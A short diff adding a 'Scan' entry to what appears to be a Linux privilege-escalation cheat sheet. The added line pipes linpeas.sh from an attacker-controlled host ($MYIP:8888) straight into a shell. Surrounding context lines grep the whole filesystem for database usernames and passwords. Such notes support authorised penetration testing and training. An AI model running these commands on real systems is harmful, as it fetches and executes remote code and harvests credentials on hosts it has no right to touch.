@@ -1225,6 +1225,9 @@ find / -group sysadm 2>/dev/null
 newgrp developer
 newgrp sysadm
 
++---------- Scan ----------+
+curl http://$MYIP:8888/linux/linpeas.sh | sh
+
 +---------- Find Usernames / Passwords ----------+
 (grep -IrinE '^\s*db[-_]?user\w*\s*=\s*|^\s*db[-_]?pass\w*\s*=\s*' / 2>/dev/null &)
 
